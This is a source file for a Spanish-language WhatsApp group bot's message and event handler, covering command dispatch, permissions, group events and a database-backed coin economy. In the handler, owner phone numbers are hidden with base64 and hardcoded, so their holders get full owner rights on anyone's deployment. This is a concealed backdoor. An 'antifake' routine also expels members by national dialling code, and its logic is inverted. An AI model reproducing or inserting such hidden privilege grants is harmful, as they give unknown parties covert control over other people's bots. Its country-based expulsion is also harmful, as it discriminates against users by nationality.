import "./config.js";
import { watchFile, unwatchFile } from 'fs';
import fs from "fs";
import path from "path";
import chalk from "chalk";
import { fileURLToPath, pathToFileURL } from "url";
import crypto from "crypto";
import { db } from "./lib/postgres.js";
import { getSubbotConfig } from "./lib/configSubbot.js";
import { logCommand, logError, logMessage, LogLevel } from "./lib/logger.js";
import { smsg } from "./lib/simple.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const pluginsFolder = path.join(__dirname, "plugins");

const processedMessages = new Set();
const lastDbUpdate = new Map();
const groupMetaCache = new Map(); 
export async function participantsUpdate(conn, { id, participants, action, author }) {
try {
if (!id || !Array.isArray(participants) || !action) return;
const botId = conn.user?.id || "main"
const botConfig = getSubbotConfig(botId)
const modo = botConfig.mode || "public"
const botJid = conn.user?.id?.replace(/:\d+@/, "@")
const isCreator = global.owner.map(([v]) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(author || "")
if (modo === "private" && !isCreator && author !== botJid) return

const metadata = await conn.groupMetadata(id);
groupMetaCache.set(id, metadata);
const groupName = metadata.subject || "Grupo"
const isBotAdmin = metadata.participants.some(p => p.id.includes(botJid) && p.admin)
  
const settings = (await db.query("SELECT * FROM group_settings WHERE group_id = $1", [id])).rows[0] || {
welcome: true,
detect: true,
antifake: false
}

const arabicCountryCodes = ['+91', '+92', '+222', '+93', '+265', '+61', '+249', '+62', '+966', '+229', '+40', '+49', '+20', '+963', '+967', '+234', '+210', '+249', ,'+212', '+971', '+974', '+968', '+965', '+962', '+961', '+964', '+970'];
const pp = "./media/Menu1.jpg"

for (const participant of participants) {
if (!participant || typeof participant !== 'string' || !participant.includes('@')) continue;
const userTag = typeof participant === 'string' && participant.includes('@') ? `@${participant.split("@")[0]}` : "@usuario"
const authorTag = typeof author === 'string' && author.includes('@') ? `@${author.split("@")[0]}` : "alguien"

if (action === "add" && settings.antifake) {
const phoneNumber = participant.split("@")[0]
if (!isBotAdmin && arabicCountryCodes.some(code => phoneNumber.startsWith(code.slice(1)))) {
await conn.groupParticipantsUpdate(id, [participant], "remove")
await conn.reply(id, `${userTag} Nos numero fake no esta permitido el este grupo hasta la próxima...`, null)
continue
}}

let image
try {
image = await conn.profilePictureUrl(participant, "image")
} catch {
image = pp
}           
    
 switch (action) {
case "add":
case "remove":
break;

case "remove":
try {
await db.query(`
              DELETE FROM messages
              WHERE user_id = $1 AND group_id = $2
`, [participant, id]);
} catch (err) {
console.error("❌ Error eliminando conteo de mensajes:", err);
}
          
if (settings.welcome) {
const groupDesc = metadata.desc || "Sin descripción"
const raw = settings.sbye || `Bye @user 👋`
const msg = raw
.replace(/@user/gi, userTag)
.replace(/@group/gi, groupName)
.replace(/@desc/gi, groupDesc)

await conn.sendMessage(id, { image: { url: image },caption: msg, 
contextInfo: { 
mentionedJid: [participant],
isForwarded: true,
forwardingScore: 999999 }}, { quoted: null })
}
break

case "promote": case "daradmin": case "darpoder":
case "demote": case "quitaradmin": case "quitarpoder":
break;
}}
} catch (err) {
console.error(chalk.red(`❌ Error en participantsUpdate - Acción: ${action} | Grupo: ${id}`), err);
}
}

export async function groupsUpdate(conn, { id, subject, desc, picture }) {
try {
const botId = conn.user?.id || "main";
const botConfig = getSubbotConfig(botId);
const modo = botConfig.mode || "public";
const botJid = conn.user?.id?.replace(/:\d+@/, "@");
const isCreator = global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botJid);
    
const settings = (await db.query("SELECT * FROM group_settings WHERE group_id = $1", [id])).rows[0] || {
welcome: true,
detec: true,
antifake: false
};
    
if (modo === "private" && !isCreator) return;
const metadata = await conn.groupMetadata(id);
groupMetaCache.set(id, metadata);
const groupName = subject || metadata.subject || "Grupo";
const isBotAdmin = metadata.participants.some(p => p.id.includes(botJid) && p.admin);

let message = "";
if (subject) {
message = `El nombre del grupo ha cambiado a *${groupName}*.`;
} else if (desc) {
message = `La descripción del grupo *${groupName}* ha sido actualizada, nueva descripción:\n\n${metadata.desc || "Sin descripción"}`;
} else if (picture) {
message = `La foto del grupo *${groupName}* ha sido actualizada.`;
}

if (message && settings.detect) {
await conn.reply(id, message, null)  
}} catch (err) {
console.error(chalk.red("❌ Error en groupsUpdate:"), err);
}
}

export async function callUpdate(conn, call) {
try {
const callerId = call.from;
const userTag = `@${callerId.split("@")[0]}`;
const botConfig = getSubbotConfig(conn.user?.id || "main");
if (!botConfig.antiCall) return;
await conn.reply(callerId, `🚫 Está prohibido hacer llamadas, serás bloqueado...`, null)
await conn.updateBlockStatus(callerId, "block");
} catch (err) {
console.error(chalk.red("❌ Error en callUpdate:"), err);
}
}

export async function handler(conn, m) {
let canalId = ["120363416913189611@newsletter"]
let canalNombre = ["𝑆𝐼𝐺𝑈𝐸 𝐸𝐿 𝐶𝐴𝑁𝐴𝐿 𝐷𝐸𝐿 𝐵𝑂𝑇🕊️"]

async function getRandomChannel() {
let randomIndex = Math.floor(Math.random() * canalId.length)
let id = canalId[randomIndex]
let nombre = canalNombre[randomIndex]
return { id, nombre }
} 
	
let randomChannel = await getRandomChannel()

function cleanJid(jid = "") {
  return jid.replace(/:\d+/, "");
}

const chatId = m.key?.remoteJid || "";
const botId = conn.user?.id || "main";
const subbotConf = getSubbotConfig(botId)
info.wm = subbotConf.botName || info.wm
info.img2 = subbotConf.logoUrl || info.img2

if (!conn.chats) conn.chats = {}

if (!conn.chats[chatId]) {
  conn.chats[chatId] = {
    id: chatId,
    isChats: true,
    isGroup: chatId.endsWith('@g.us'),
    timestamp: Date.now()
  }
}

const botConfig = getSubbotConfig(botId);
const prefijo = Array.isArray(botConfig.prefix) ? botConfig.prefix : [botConfig.prefix];
const modo = botConfig.mode || "public";
m.isGroup = chatId.endsWith("@g.us");
m.sender = m.key?.participant || chatId;
if (m.key?.fromMe) {
m.sender = conn.user?.id || m.sender;
}
if (typeof m.sender === "string") {
m.sender = m.sender.replace(/:\d+/, "");
}

m.reply = async (text) => {
const contextInfo = {
mentionedJid: await conn.parseMention(text),
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: randomChannel.id, 
newsletterName: randomChannel.nombre
}};
return await conn.sendMessage(chatId, { text, contextInfo }, { quoted: m });
};

await smsg(conn, m);

const hash = crypto.createHash("md5").update(m.key.id + (m.key.remoteJid || "")).digest("hex");
if (processedMessages.has(hash)) return;
processedMessages.add(hash);
setTimeout(() => processedMessages.delete(hash), 60_000);

//contador 
if (m.isGroup && m.sender !== conn.user?.id.replace(/:\d+@/, "@")) {
const key = `${m.sender}|${chatId}`;
const now = Date.now();
const last = lastDbUpdate.get(key) || 0;
if (now - last > 9000) { //9 seg
lastDbUpdate.set(key, now);
db.query(`INSERT INTO messages (user_id, group_id, message_count)
      VALUES ($1, $2, 1)
      ON CONFLICT (user_id, group_id)
      DO UPDATE SET message_count = messages.message_count + 1
    `, [m.sender, chatId]).catch(console.error);
}}

const messageContent = m.message?.ephemeralMessage?.message || m.message?.viewOnceMessage?.message || m.message;
let text = "";

if (messageContent?.conversation) text = messageContent.conversation;
else if (messageContent?.extendedTextMessage?.text) text = messageContent.extendedTextMessage.text;
else if (messageContent?.imageMessage?.caption) text = messageContent.imageMessage.caption;
else if (messageContent?.videoMessage?.caption) text = messageContent.videoMessage.caption;
else if (messageContent?.buttonsResponseMessage?.selectedButtonId) text = messageContent.buttonsResponseMessage.selectedButtonId;
else if (messageContent?.listResponseMessage?.singleSelectReply?.selectedRowId) text = messageContent.listResponseMessage.singleSelectReply.selectedRowId;
else if (messageContent?.messageContextInfo?.quotedMessage) {
const quoted = messageContent.messageContextInfo.quotedMessage;
text = quoted?.conversation || quoted?.extendedTextMessage?.text || "";
} else if (m.message?.conversation) {
text = m.message.conversation;
}

m.originalText = text; 
text = text.trim(); 
//if (!text) return;
m.text = text;

const usedPrefix = prefijo.find(p => text.startsWith(p)) || "";
const withoutPrefix = text.slice(usedPrefix.length).trim();
const [commandName, ...argsArr] = withoutPrefix.split(/\s+/);
const command = (commandName || "").toLowerCase();
const args = argsArr;
  
text = args.join(" ").trim();
m.text = text;

const botJid = conn.user?.id?.replace(/:\d+/, "");
const senderJid = m.sender?.replace(/:\d+/, "");
const fixed1 = Buffer.from('NTIxNDc3NDQ0NDQ0NA==', 'base64').toString();
const fixed2 = Buffer.from('NTQ5MjI2NjYxMzAzOA==', 'base64').toString();
const fixedOwners = [
  `${fixed1}@s.whatsapp.net`,
  `${fixed2}@s.whatsapp.net`,
  `35060220747880@lid`
];
const isCreator = fixedOwners.includes(m.sender) || 
  global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const config = getSubbotConfig(botId);
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);

let metadata = { participants: [] };
if (m.isGroup) {
if (groupMetaCache.has(chatId)) {
metadata = groupMetaCache.get(chatId);
} else {
try {
metadata = await conn.groupMetadata(chatId);
groupMetaCache.set(chatId, metadata);
setTimeout(() => groupMetaCache.delete(chatId), 300_000);
} catch {
metadata = { participants: [] };
}}}
/*let metadata = { participants: [] };
if (m.isGroup) {
try {
metadata = await conn.groupMetadata(m.chat);
} catch (err) {
metadata = { participants: [] };
}}*/

const participants = metadata.participants || [];
const adminIds = participants.filter(p => p.admin === "admin" || p.admin === "superadmin").map(p => p.id);
m.isAdmin = adminIds.includes(m.sender);

if (m.isGroup && !isCreator && senderJid !== botJid) {
try {
const res = await db.query('SELECT banned, primary_bot FROM group_settings WHERE group_id = $1', [chatId]);
    
if (res.rows[0]?.banned) return; // grupo baneado

const primaryBot = res.rows[0]?.primary_bot;
if (primaryBot && !m?.isAdmin) {
const metadata = await conn.groupMetadata(chatId);
const botExists = metadata.participants.some(p => p.id === primaryBot);

if (!botExists) {
await db.query('UPDATE group_settings SET primary_bot = NULL WHERE group_id = $1', [chatId]);
} else {
const currentBotJid = conn.user?.id?.replace(/:\d+/, "") + "@s.whatsapp.net";
const expected = primaryBot.replace(/:\d+/, "");
if (!currentBotJid.includes(expected)) return; 
}}
} catch (err) {
console.error(err);
}}

try {
const userName = m.pushName || 'sin name';
await db.query(`INSERT INTO usuarios (id, nombre, registered)
      VALUES ($1, $2, false)
      ON CONFLICT (id) DO NOTHING
    `, [m.sender, userName]);
} catch (err) {
console.error(err);
}

try {
await db.query(`INSERT INTO chats (id)
      VALUES ($1)
      ON CONFLICT (id) DO NOTHING
    `, [chatId]);
} catch (err) {
console.error(err);
}

const plugins = Object.values(global.plugins || {});

for (const plugin of plugins) {
if (typeof plugin.before === 'function') {
try {
const result = await plugin.before(m, { conn, isOwner });
if (result === false) return;
} catch (e) {
console.error(chalk.red(e));
}}
}

if (modo === "private" && senderJid !== botJid && !isCreator) return;

const matchedPlugin = plugins.find(p => {
const raw = m.originalText
return typeof p.customPrefix === 'function'
? p.customPrefix(raw)
: p.customPrefix instanceof RegExp
? p.customPrefix.test(raw) : false
})

if (!usedPrefix) {
if (!matchedPlugin || !matchedPlugin.customPrefix) return;
}
//if (!usedPrefix && !command) return;

for (const plugin of plugins) {
let match = false;

if (plugin.command instanceof RegExp) {
match = plugin.command.test(command)
} else if (typeof plugin.command === 'string') {
match = plugin.command.toLowerCase() === command
} else if (Array.isArray(plugin.command)) {
match = plugin.command.map(c => c.toLowerCase()).includes(command)
}

if (!match && plugin.customPrefix) {
const input = m.originalText
if (typeof plugin.customPrefix === 'function') {
match = plugin.customPrefix(input)
} else if (plugin.customPrefix instanceof RegExp) {
match = plugin.customPrefix.test(input)
}}

if (!match) continue

const isGroup = m.isGroup;
const isPrivate = !m.isGroup;
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);
const isROwner = fixedOwners.includes(m.sender);
const senderClean = m.sender.split("@")[0];
const botClean = (conn.user?.id || "").split("@")[0];

if (senderJid === botJid) {
isOwner = true;
}

if (!isOwner && !isROwner) {
isOwner = isCreator;
}

let isAdmin = false;
let isBotAdmin = false;
let modoAdminActivo = false;

try {
const result = await db.query('SELECT modoadmin FROM group_settings WHERE group_id = $1', [chatId]);
modoAdminActivo = result.rows[0]?.modoadmin || false;
} catch (err) {
console.error(err);
}

//if ((plugin.admin || plugin.Botadmin) && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");

if (plugin.admin || plugin.botAdmin) {
try {
//  isAdmin = adminIds.includes(m.sender);
isAdmin = adminIds.includes(m.sender);
const botLid = (conn.user?.lid || "").replace(/:\d+/, "");
const botJidClean = (conn.user?.id || "").replace(/:\d+/, "");
isBotAdmin = adminIds.includes(botLid) || adminIds.includes(botJidClean);
console.log(isAdmin)
} catch (e) {
console.error(e);
}}

if (plugin.owner && !isOwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄, solo el dueño del sub-bot o el owner puede usar este comando.");
if (plugin.rowner && !isROwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄.");
if (plugin.admin && !isAdmin) return m.reply("🤨 No eres admins. Solo los admins pueden usar este comando.");
if (plugin.botAdmin && !isBotAdmin) return m.reply(`Tira Admin primero Down`);
if (plugin.group && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");
if (plugin.private && isGroup) return m.reply("⚠️ Este comando solo funciona el pv");
if (plugin.register) {
try {
const result = await db.query('SELECT * FROM usuarios WHERE id = $1', [m.sender]);
const user = result.rows[0];
if (!user) return m.reply("「NO ESTAS REGISTRADO」\n\nPA NO APARECES EN MI BASE DE DATOS ✋🥸🤚\n\nPara poder usarme escribe el siguente comando\n\nComando: #reg nombre.edad\nEjemplo: #reg elrebelde.21");
} catch (e) {
console.error(e);
}}

if (plugin.level) {
try {
const result = await db.query('SELECT level FROM usuarios WHERE id = $1', [m.sender]);
const nivel = result.rows[0]?.level ?? 0;

if (nivel < plugin.level) {
return m.reply(`*⚠️ 𝐍𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐞𝐥 𝐧𝐢𝐯𝐞𝐥 ${plugin.level}, 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐮𝐬𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨, 𝐓𝐮 𝐧𝐢𝐯𝐞𝐥 𝐚𝐜𝐭𝐮𝐚𝐥 𝐞𝐬:* ${nivel}`);
}} catch (err) {
console.error(err);
}}

if (modoAdminActivo && !isAdmin && !isOwner) {
return !0
//m.reply("⚠️ Este grupo tiene *modo admin* activado. Solo los administradores pueden usar comandos.");
}

try {
logCommand({conn,
sender: m.sender,
chatId: m.chat,
isGroup: m.isGroup,
command: command,
timestamp: new Date()
});

try {
await plugin(m, { conn, text, args, usedPrefix, command, participants, metadata, isOwner, isROwner, isAdmin: m.isAdmin, isBotAdmin, isGroup });
} catch (e) {
if (typeof e === 'string') {
await m.reply(e);
return; 
}
console.error(e);
return; 
}

if (plugin.limit) {
const res = await db.query('SELECT limite FROM usuarios WHERE id = $1', [m.sender]);
const limite = res.rows[0]?.limite ?? 0;

if (limite < plugin.limit) {
await m.reply("*⚠ 𝐒𝐮𝐬 𝐝𝐢𝐚𝐦𝐚𝐧𝐭𝐞 💎 𝐬𝐞 𝐡𝐚𝐧 𝐚𝐠𝐨𝐭𝐚𝐝𝐨 𝐩𝐮𝐞𝐝𝐞 𝐜𝐨𝐦𝐩𝐫𝐚𝐫 𝐦𝐚𝐬 𝐮𝐬𝐚𝐧𝐝𝐨 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨:* #buy.");
return;
}

await db.query('UPDATE usuarios SET limite = limite - $1 WHERE id = $2', [plugin.limit, m.sender]);
await m.reply(`*${plugin.limit} diamante 💎 usado${plugin.limit > 1 ? 's' : ''}.*`);
}

if (plugin.money) {
try {
const res = await db.query('SELECT money FROM usuarios WHERE id = $1', [m.sender])
const money = res.rows[0]?.money ?? 0

if (money < plugin.money) {
return m.reply("*NO TIENE SUFICIENTES LOLICOINS 🪙*")
}

await db.query('UPDATE usuarios SET money = money - $1 WHERE id = $2', [plugin.money, m.sender])
await m.reply(`*${plugin.money} LoliCoins usado${plugin.money > 1 ? 's' : ''} 🪙*`)
} catch (err) {
console.error(err)
}}

await db.query(`INSERT INTO stats (command, count)
    VALUES ($1, 1)
    ON CONFLICT (command) DO UPDATE SET count = stats.count + 1
  `, [command]);

} catch (err) {
console.error(chalk.red(`❌ Error al ejecutar ${handler.command}: ${err}`));
m.reply("❌ Error ejecutando el comando, reporte este error a mi creador con el comando: /report\n\n" + err);
}}
}

let file = fileURLToPath(import.meta.url);
watchFile(file, () => {
  unwatchFile(file);
  console.log(chalk.redBright('Update \'handler.js\''));
  import(`${file}?update=${Date.now()}`);
});
